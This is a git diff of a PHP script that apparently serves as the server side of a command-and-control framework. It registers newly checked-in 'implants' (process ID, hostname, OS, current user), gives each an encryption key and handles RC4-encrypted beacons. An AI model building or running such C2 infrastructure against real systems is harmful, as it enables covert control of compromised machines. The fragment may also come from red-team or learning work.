@@ -1,6 +1,7 @@
 <?php
     include "connector.php";
     include "rc4.php";
+    include "randomize.php";
 
     # Gets raw POST data
     $raw_post_data = file_get_contents("php://input");
@@ -29,13 +30,24 @@
         $temp = explode("=", $ampersand_split[3]);
         $operating_system = urldecode($temp[1]);
 
-        # TO DO: Generate encryption key here
-        # TO DO: Include "randomize.php" file and use that function to generate that encryption key
-        echo "123456"; # DEBUGGING
+        # Generates 32 character (256 bit) encryption key here
+        $encryption_key = generate_random_string();
 
-        # TO DO: When we echo the encryption key, that will need to be Base64 encoded
+        # Adds a new entry in the "implants" table
+        $statement = $database_connection->prepare("INSERT INTO `implants` (`process_id`, `hostname`, `operating_system`, `current_user`, `encryption_key`, `last_seen`) VALUES (:process_id, :hostname, :operating_system, :current_user, :encryption_key, :last_seen)");
+        $statement->bindValue(":process_id", $process_id);
+        $statement->bindValue(":hostname", $hostname);
+        $statement->bindValue(":operating_system", $operating_system);
+        $statement->bindValue(":current_user", $current_user);
+        $statement->bindValue(":encryption_key", $encryption_key);
+        $statement->bindValue(":last_seen", gmdate("Y-m-d H:i:s"));
+        $statement->execute();
 
-        # TO DO: INSERT a new entry into the "implants" table (with newly-generated encryption key)
+        # Kills database connection
+        $statement->connection = null;
+
+        # Echoes out Base64 encoded encryption key to the HTTP response        
+        echo base64_encode($encryption_key);
     }
     # Else RC4 encrypted POST data (recurring beacon)
     else {
